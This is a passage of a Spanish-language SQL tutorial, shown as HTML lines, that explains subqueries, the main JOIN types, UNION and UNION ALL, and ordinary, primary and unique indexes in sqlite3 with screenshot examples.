-&lt;p&gt;Vamos a verlo de manera practica, y vamos a realizar una consulta que ademas de mostrarnos el id del producto &lt;code&gt;ProductID&lt;/code&gt;y la cantidad &lt;code&gt;Quantity&lt;/code&gt;, tambien nos muestre el nombre del producto &lt;code&gt;ProductName&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Para ello primero seleccionaremos los campos &lt;code&gt;ProductID&lt;/code&gt; y &lt;code&gt;Quantity&lt;/code&gt; de la tabla &lt;code&gt;OrderDetails&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query58.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora en una consulta aparte, vamos a seleccionar el campo faltante &lt;code&gt;ProductName&lt;/code&gt; correspondiente a la tabla &lt;code&gt;Products&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query59.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Esta consulta sera la que utilizaremos para realizar una subconsulta dentro de nuestra primera consulta.&lt;/p&gt;
-
-&lt;p&gt;Para ello debemos de integrarlo en nuestra consulta principal como un campo y ponerlo entre &lt;code&gt;()&lt;/code&gt; y podemos ponerle el alias al que corresponde.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query60.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Podemos ver que si se nos esta incluyendo el campo, pero solo se nos muestra el primer resultado repetido. Esto se debe a que al ejecutar un &lt;code&gt;SELECT&lt;/code&gt;, por cada ejecución nos esta deolviendo el primer campo, y por lo tanto dentro debemos de establecer una condición en la que comparemos que el &lt;code&gt;ProductID&lt;/code&gt; de la tabla &lt;code&gt;OrderDetails&lt;/code&gt; sea igual al del &lt;code&gt;ProductID&lt;/code&gt; de la tabla &lt;code&gt;Products&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query61.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ejecutamos la consulta correctamente, pero ahora vemos que nos vuelve a mostrar el mismo resultado. Y esto se debe a que dentro de la &lt;code&gt;subconsulta&lt;/code&gt; no se sabe a que tabla esta haciendo referencia el &lt;code&gt;ProductID&lt;/code&gt;, por lo tanto debemos especificar que esta haciendo referencia a &lt;code&gt;OrderDetails&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query62.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;De esta manera vemos que ahora si, nos muestra los resultados correctamente.&lt;/p&gt;
-
-&lt;p&gt;Y si quiseramos adicionar mas campos, hariamos exactamente el mismo proceso solo especificando el nombres de los campos.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query63.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora que ya comprendimos como funcionan las subconsultas, volvamos a resolver lo anteriomente propuesto en el que habiamos obtenido el producto que se vendio en mayor cantidad, pero no el que mas ingreso nos genero.&lt;/p&gt;
-
-&lt;p&gt;Teniamos previamente la &lt;code&gt;CANTIDAD_TOTAL&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query65.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora debemos agregar la subconsulta que nos devuelva el precio &lt;code&gt;Price&lt;/code&gt;, podemos usar un alias para acortar el nombre de la tabla &lt;code&gt;OrderDetails&lt;/code&gt; como &lt;code&gt;OD&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query64.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora solo nos faltaria calcular el monto total e ingreso, para ello tendriamos que multiplicar la &lt;code&gt;CANTIDAD_TOTAL&lt;/code&gt; por el &lt;code&gt;PRECIO&lt;/code&gt;, pero debido a que no podemos usar un &lt;code&gt;ALIAS&lt;/code&gt;, necesariamanete debemos insertar nuevamente la subconsulta que nos generaba el alias y de la misma manera tambien insertar la función de agregación, adicionalmente agregaremos el &lt;code&gt;NOMBRE_PRODUCTO&lt;/code&gt; para verlo mas descriptivo.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query66.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Y en conclusión vemos que el producto que mas se vendio, no necesariamente corresponde al que mas ingresos nos aporto.&lt;/p&gt;
-
-&lt;p&gt;Otra cosa acerca de las subconsultas, es que tambien las podemos usar en condicionales como un &lt;code&gt;WHERE&lt;/code&gt;, para realizar operaciones con un campo sin necesidad de mostrarlo.&lt;/p&gt;
-
-&lt;p&gt;Para ello vamos a modificar nuestra consulta anterior y borrar el campo que correspondia a el &lt;code&gt;PRECIO&lt;/code&gt; y utilizarlo para establecer una condición donde solo nos devuelva los precios mayores a 100.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query67.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Algo muy intersante a mencionar es que el resultado de esta subconsulta, nos devuelve una especie de tabla virtual en la que podemos seguir trabajando. Ya que nuestra subconsulta anterior, podemo meterla dentro de un &lt;code&gt;SELECT&lt;/code&gt; y volver a trabajar desde ahi como si fuera otra tabla mas simplificado.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query68.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;De esta manera podemos trabajar en ella como si fuera otra tabla, como en este caso seleccionando el campo &lt;code&gt;NOMBRE_PRODUCTO&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Intentemos realizar algo mas complejo usando subconsultas, como mostrar el total de ordenes realizadas por los clientes, siempre y cuando estas sean mayores a su promedio.&lt;/p&gt;
-
-&lt;p&gt;Par ello primero tenemos que seleccionar el nombre &lt;code&gt;CustomerName&lt;/code&gt; de la tabla empleados &lt;code&gt;Employees&lt;/code&gt; y dentro ejecutaremos una subconsulta que nos muestre la suma de la cantidad de ordenes &lt;code&gt;SUM(Quantity)&lt;/code&gt; esto de la tabla &lt;code&gt;OrderDetails&lt;/code&gt; y de la tabla &lt;code&gt;Orders&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query69.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Esto nos devolvera la &lt;code&gt;CANTIDAD_DE_ORDENES_REALIZADAS&lt;/code&gt;, pero con solo un valor muy grande referido a la cantidad total de ordenes despues de realizar una especie de multiplicación como un producto cartesiano que no es la correspondiente y para poder obtener el valor verdadero. Debemos de establecer una primera condición donde el &lt;code&gt;CustomerID&lt;/code&gt; de la tabla &lt;code&gt;Customers&lt;/code&gt; sea igual al de la tabla &lt;code&gt;Orders&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query70.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora tambien debemos validar que el id de la orden &lt;code&gt;OrderID&lt;/code&gt; de la tabla &lt;code&gt;Orders&lt;/code&gt; y &lt;code&gt;OrderDetails&lt;/code&gt; sea el mismo, y de esta manera obtendriamos la cantidad total de ordenes realizadas por nuestros clientes &lt;code&gt;Customers&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query71.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ya llegados a este punto queremos que solo nos muestren los resultados que sean mayor al promedio de ordenes.&lt;/p&gt;
-
-&lt;p&gt;Para esto tenemos que recordar lo anteriormente mencionado de que podemos efectuar subconsultas en un &lt;code&gt;WHERE&lt;/code&gt;, por ello primero buscaremos calcular el promedio del total de ordenes de el resultado de una subconsulta a la que llamaremos &lt;code&gt;CANTIDAD_TOTAL_ORDENES&lt;/code&gt; proveniente de la tabla &lt;code&gt;Customers&lt;/code&gt; al cual asignaremos como alias &lt;code&gt;C2&lt;/code&gt; para evitar problemas ya que contamos con una denombre &lt;code&gt;C1&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query72.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Y dentro de esa subconsulta vamos a insertar la primera subconsulta que realizamos con la cual obteniamos la &lt;code&gt;CANTIDAD_ORDENES_REALIZADAS&lt;/code&gt;, solo que esta vez provendra de la tabla &lt;code&gt;Customers&lt;/code&gt; con el alias &lt;code&gt;C2&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query73.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Asi con el uso de subconsultas, lograriamos obtener el resultado donde la &lt;code&gt;CANTIDAD_ORDENES_REALIZADAS&lt;/code&gt; son mayores al promedio.&lt;/p&gt;
-
-&lt;p&gt;Con esto concluimos que podemos usar las subconsultas en ciertos casos, pero existe una forma mejor de poder realizar estas acciones y nos eviten tener un codigo tan extenso como el que generamos y estos vendrian a ser los &lt;code&gt;JOINS&lt;/code&gt; de los cuales hablaremos a continuación.&lt;/p&gt;
-
-&lt;h2 id=&quot;joins&quot;&gt;JOINS &lt;a href=&quot;#joins&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Son operaciones que realizamos para combinar los datos de dos o mas tablas de nuestra base de datos, pero que esta información se devuelva en una tabla nueva.&lt;/p&gt;
-
-&lt;p&gt;Existen varios tipos de &lt;code&gt;JOINS&lt;/code&gt; y entre los principales tenemos cinco:&lt;/p&gt;
-
-&lt;h2 id=&quot;cross-join&quot;&gt;CROSS JOIN &lt;a href=&quot;#cross-join&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Son el resultado de unir dos tablas, como si se tratase de un producto cartesiano.&lt;/p&gt;
-
-&lt;p&gt;Supongamos tenemos dos tablas, una de &lt;code&gt;estudiantes&lt;/code&gt; y otra de &lt;code&gt;lenguajes&lt;/code&gt;, si aplicaramos un &lt;code&gt;CROSS JOIN&lt;/code&gt; daria como resultado el producto cartesiano de ambas tablas.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab13.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Existen dos formas de definirlos, las cuales son implicita y explicita.&lt;/p&gt;
-
-&lt;p&gt;Implicitamente cuando definimos un &lt;code&gt;CROSS JOIN&lt;/code&gt;, pero sin usar el termino &lt;code&gt;JOIN&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Si lo aplicamos a las tablas de empleados &lt;code&gt;Employees&lt;/code&gt; y ordenes &lt;code&gt;Orders&lt;/code&gt;, nos da como resultado el producto cartesiano de ambas ya que nuestra tabla &lt;code&gt;Employees&lt;/code&gt; tiene 10 registros y &lt;code&gt;Orders&lt;/code&gt; 196, como resultado nos devuelve 1960 registro relacionados.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query74.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Tambien podemos obtener el mismo resultado si lo aplicamos de manera explicita, para ello varia un poco la sintaxis.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query75.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Este tipo de join casi no se usa, pero es recomendable conocer como funciona.&lt;/p&gt;
-
-&lt;h2 id=&quot;inner-join&quot;&gt;INNER JOIN &lt;a href=&quot;#inner-join&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Es el resultado de la busqueda de coincidencia de dos o mas tablas en función a la columna que tengan en comun.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/img1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Supongamos tenemos dos tablas una de personas que estudian y otra de personas que trabajan, como resultado el &lt;code&gt;INNER JOIN&lt;/code&gt; nos daria unicamente las coincidencias de ambas tablas donde las personas estudian y trabajan.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab14.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Para aplicarlo a nuestra tablas de empleados y ordenes, primero debemos seleccionar nuestra tabla &lt;code&gt;Employees&lt;/code&gt; y seguidamente &lt;code&gt;INNER JOIN&lt;/code&gt; con la tabla &lt;code&gt;Orders&lt;/code&gt; y finalmente para ejecutar la concidencia usaremos &lt;code&gt;ON&lt;/code&gt; especificando que queremos nos lo ejecute solo cuando el &lt;code&gt;EmployeeID&lt;/code&gt; de ambas tablas sean iguales.&lt;/p&gt;
-
-&lt;p&gt;Esto nos dara como resultado una nueva tabla donde solo nos muestren los datos cuando coincidan los &lt;code&gt;EmployeeID&lt;/code&gt; en ambas tablas.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query76.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Para entenderlo mejor de manera practica, vamos a crearnos una tabla adicional con el nombre &lt;code&gt;Gratificacion&lt;/code&gt;, en donde haremos referencia al &lt;code&gt;EmployeeID&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query77.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora insertaremos algunos valores al azar para poder trabajar nuestro &lt;code&gt;JOIN&lt;/code&gt; con esta tabla.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query78.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Adicional a ello insertaremos algunos valores &lt;code&gt;NULL&lt;/code&gt;, para este caso.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query79.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Nuestra tabla nos queda de la siguiente forma, donde podemos observar existen valores nulos.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query80.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora vamos a proceder a realizar un &lt;code&gt;INNER JOIN&lt;/code&gt;, tomando como tablas &lt;code&gt;Employees&lt;/code&gt; y &lt;code&gt;Gratificacion&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query81.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Como resultado, podemos ver que solo se nos muestran las coincidencias y no los valores &lt;code&gt;NULL&lt;/code&gt; ya que estos al no coincidir con el &lt;code&gt;EmployeeID&lt;/code&gt; no los concidera.&lt;/p&gt;
-
-&lt;h2 id=&quot;left-join&quot;&gt;LEFT JOIN &lt;a href=&quot;#left-join&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;En el &lt;code&gt;LEFT JOIN&lt;/code&gt; se toma como prioritaria a toda la tabla de la izquierda y solo una parte de la tabla derecha, concretamente solo si existe alguna coincidencia.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/img2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Usemos el mismo caso donde tenemos dos tablas de personas que estudian y otra de personas que trabajan, si aplicamos un &lt;code&gt;LEFT JOIN&lt;/code&gt;, como resultado tendriamos todos los datos de la tabla &lt;code&gt;personas que estudian&lt;/code&gt; con sus coincidencias y de no existir alguna se completaria con valores &lt;code&gt;NULL&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab15.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Si ahora lo vemos de manera practica y usamos en nuestras tablas &lt;code&gt;Employees&lt;/code&gt; y &lt;code&gt;Gratificacion&lt;/code&gt;, es muy simple ya que solo debemos cambiar la palabra inner por &lt;code&gt;LEFT&lt;/code&gt; y igualmente para establecer la comparacion usamos &lt;code&gt;ON&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query82.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;El resultado de la consulta nos muestra todos los valores de la tabla &lt;code&gt;Employees&lt;/code&gt; y de la tabla &lt;code&gt;Gratificacion&lt;/code&gt; solo los valores donde exista coindencias, y en las que no existan nos las completa con valores nulos.&lt;/p&gt;
-
-&lt;h2 id=&quot;right-join&quot;&gt;RIGHT JOIN &lt;a href=&quot;#right-join&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Similar al left join cuando usamos &lt;code&gt;RIGHT JOIN&lt;/code&gt;, se toman todos los datos de la tabla derecha y solo parte de la izquierda.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/img3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;De la misma manera con nuestras tablas de persona que estudian y trabajan, al aplicar un &lt;code&gt;RIGHT JOIN&lt;/code&gt; tendriamos como resultado todos los valores de la tabla derecha &lt;code&gt;personas que trabajan&lt;/code&gt; y de no existir coincidencias de igual modo se completarian con datos de tipo &lt;code&gt;NULL&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab16.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Aplicandolo nuevamente a nuestras tablas &lt;code&gt;Employees&lt;/code&gt; y &lt;code&gt;Gratificacion&lt;/code&gt;, seria muy parecido a lo anterior, solo que en este caso particular, &lt;code&gt;sqlite3&lt;/code&gt; no admite la función &lt;code&gt;RIGHT JOIN&lt;/code&gt;, ya que si la tratamos de ejecutar nos genera un error.&lt;/p&gt;
-
-&lt;p&gt;Aunque en otros tipos de gestores esta opción si es valida, hay un manera logica y facil de solucionar esto en &lt;code&gt;sqlite3&lt;/code&gt; y es tan sencillo como aplicar un &lt;code&gt;LEFT JOIN&lt;/code&gt;, pero cambiar el orden de las tablas y de esa manera es como si ejecutaramos un &lt;code&gt;RIGHT JOIN&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query83.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Y asi de una forma simple logramos aplicar un &lt;code&gt;RIGHT JOIN&lt;/code&gt; que vendria mas o menos a ser un &lt;code&gt;LEFT JOIN&lt;/code&gt; inverso .&lt;/p&gt;
-
-&lt;h2 id=&quot;full-join&quot;&gt;FULL JOIN &lt;a href=&quot;#full-join&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;A diferencia que el left y right join, cuando aplicamos un &lt;code&gt;FULL JOIN&lt;/code&gt; nos devuelve todo, es decir la suma de las tablas.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/img4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Es la union de todas las tablas, al aplicar un &lt;code&gt;FULL JOIN&lt;/code&gt;, nos devuelve todos los valores de ambas tablas y no de existir coindencias entre algunos campos, de la misma manera nos los muestra con valores nulos &lt;code&gt;NULL&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab17.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Para poder aplicarlo en &lt;code&gt;sqlite3&lt;/code&gt; de manera practica, tambien tenemos un problema puesto que tampo acepta la ejecución de &lt;code&gt;FULL JOIN&lt;/code&gt;, pero para ello podemos usar una clausula
-que nos permita unir tanto el &lt;code&gt;LEFT JOIN&lt;/code&gt; como el &lt;code&gt;RIGTH JOIN&lt;/code&gt; y esta tiene por nombre  &lt;code&gt;UNION&lt;/code&gt;.&lt;/p&gt;
-
-&lt;h2 id=&quot;clausula-union&quot;&gt;CLAUSULA UNION &lt;a href=&quot;#clausula-union&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;La clausula &lt;code&gt;UNION&lt;/code&gt; la utilizamos para combinar el resultado de dos o mas consultas en un solo conjunto de datos.&lt;/p&gt;
-
-&lt;p&gt;Para poder usar esta clausula se deben tener la misma cantidad de columnas y los tipos de datos deben de ser compatibles.&lt;/p&gt;
-
-&lt;p&gt;Lo que hace concretamente &lt;code&gt;UNION&lt;/code&gt; es la devolvernos una unica tabla que contenga las filas combinadas de las tablas, eliminando las duplicadas.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab18.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Si ahora ejecutamos un &lt;code&gt;LEFT JOIN&lt;/code&gt; y un &lt;code&gt;RIGHT JOIN&lt;/code&gt;, al unir ambas consultas con un &lt;code&gt;UNION&lt;/code&gt; obtendremos como resultado un &lt;code&gt;FULL JOIN&lt;/code&gt; simulado.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query84.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;clausula-union-all&quot;&gt;CLAUSULA UNION ALL &lt;a href=&quot;#clausula-union-all&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;A diferencia que al usar union, cuando usamos la clausula &lt;code&gt;UNION ALL&lt;/code&gt;, de la combinación de las filas no se eliminan las que son duplicadas y tampoco se realiza una verificación de la compatibilidad de datos.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab19.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Como resultado si lo aplicamos a  nuestros &lt;code&gt;JOINS&lt;/code&gt;, nos devulve mas datos, donde podemos ver que estos se duplican.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query85.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;En conclusión podriamos inferir que al combinar con &lt;code&gt;UNION&lt;/code&gt; nos elimina las filas duplicadas y al usar &lt;code&gt;UNION ALL&lt;/code&gt; de existir filas duplicadas las muestra.&lt;/p&gt;
-
-&lt;h2 id=&quot;indices&quot;&gt;INDICES &lt;a href=&quot;#indices&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Los indices en &lt;code&gt;SQL&lt;/code&gt; vienen a ser una estructura de datos que mejoran la velocidad de la consultas y las operaciones de busquedas en un tabla. En terminos mas simples un indice nos permite acceder rapidamente a los registros de una tabla en función de los valores de una o mas columnas, de esta manera nuestras busquedas son mas eficientes.&lt;/p&gt;
-
-&lt;h2 id=&quot;indices-ordinarios-index&quot;&gt;INDICES ORDINARIOS - INDEX &lt;a href=&quot;#indices-ordinarios-index&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Los indices ordinarios o no unicos, crean indices que se pueden duplicar y ademas permiten incluir valores nulos. Solo usa el indice para buscar mas rapido pero obvia si existen o no duplicados.&lt;/p&gt;
-
-&lt;p&gt;Para crear un indice debemos usar &lt;code&gt;CREATE INDEX&lt;/code&gt; y seguido el nombre a asignar, depues con &lt;code&gt;ON&lt;/code&gt; especificaremos de que tabla queremos crear el indice y finalmente entre &lt;code&gt;()&lt;/code&gt; debemos espeficar el campo especifico sobre el cual lo aplicaremos.&lt;/p&gt;
-
-&lt;p&gt;En este caso primero ejecutaremos una consulta que nos muestre todo de la tabla clientes &lt;code&gt;Customers&lt;/code&gt;, donde el &lt;code&gt;ContactName&lt;/code&gt; corresponda al de &lt;code&gt;Hanna Moos&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query86.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Podemos observar que nuestra consulta se ejecuta en un periodo de &lt;code&gt;5ms&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Lo siguiente que haremos es crear un indice en el campo &lt;code&gt;ContactName&lt;/code&gt; de la tabla &lt;code&gt;Customers&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query87.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora si volvemos a ejecutar la consulta anterior, observamos que la consulta esta vez solo tarda &lt;code&gt;1ms&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query88.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Esto no puede parecer notorio a consultas en una escala baja, pero de esta manera los &lt;code&gt;INDICES&lt;/code&gt; nos dan una solución con la que podemos alivianar bastante el tiempo de consultas que son muy pesadas.&lt;/p&gt;
-
-&lt;h2 id=&quot;indices-primarios-primary-keys&quot;&gt;INDICES PRIMARIOS - PRIMARY KEYS &lt;a href=&quot;#indices-primarios-primary-keys&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Los indices primarios, son los ya mencionados &lt;code&gt;PRIMARY KEYS&lt;/code&gt;, estos tienen como finalidad el permitirnos identidicar las filas de manera unica.&lt;/p&gt;
-
-&lt;p&gt;En este caso puntual si seleccionamos los datos de la tabla &lt;code&gt;Customers&lt;/code&gt;, los indices primarios serian los valores correspondientes al &lt;code&gt;CustomerID&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query90.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;indices-unicos-unique-index&quot;&gt;INDICES UNICOS - UNIQUE INDEX &lt;a href=&quot;#indices-unicos-unique-index&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Este tipo de indice garantiza que los valores de una columna sean unicos en una tabla, esto implica que no puede haber duplicados en la columna y por ello al crearlos, ademas de mejorar el rendimiento de nuestras consultas verifica que no existan duplicados ni tampoco valores nulos. Puede aplicarse a uno o varios campos.&lt;/p&gt;
-
-&lt;p&gt;Para crear este tipo de indice es similar al ordinario, solo que debemos de agregar la palabra &lt;code&gt;UNIQUE&lt;/code&gt; y lo vamos a crear en nuestra tabla &lt;code&gt;Employees&lt;/code&gt; especificamente en los campos &lt;code&gt;Firtsname&lt;/code&gt; y &lt;code&gt;Lastname&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query89.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;De esta manera lo que vamos a conseguir es que no se permita crear dos registros que tengan el mismo nombre &lt;code&gt;Firtsname&lt;/code&gt;y apellido &lt;code&gt;Lastname&lt;/code&gt;. En tal sentido podemos crear registros que tengan distintos nombres y apellidos, pero si tratamos de insertar el mismo nombre y el mismo apellido, logicamente ya que dos personas no pueden tener los mismos datos correspondientes funciona como una especie de validación.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query91.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Concluimos que con este tipo de indice ademas que podemos tener un mejor rendimiento en nuestras consultas, tambien nos aseguramos de que no puedan existir valores duplicados. Si lo vemos practicamente en terminos reales es como cuando tratamos de registrarnos con un nombre de usuario y si este ya existe el sistema nos arroja un error, donde nos exige que intentemos con otros nombre de usuario.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Los indices consumen mucho espacio en disco, por ello si creamos demasiados indices podemos generar un impacto negativo, ademas que cuando se hace operaciones de alteracion de una tabla tambien se actualizan los indices y esto relentiza las operaciones de escritura. Por ello debemos de usar indices solo cuando sean necesarios, recomendablemente en consultas que realizamos constantemente o cuando tienen una alta cardinalidad en otras palabras cuando estemos trabajando con muchos indices.&lt;/p&gt;
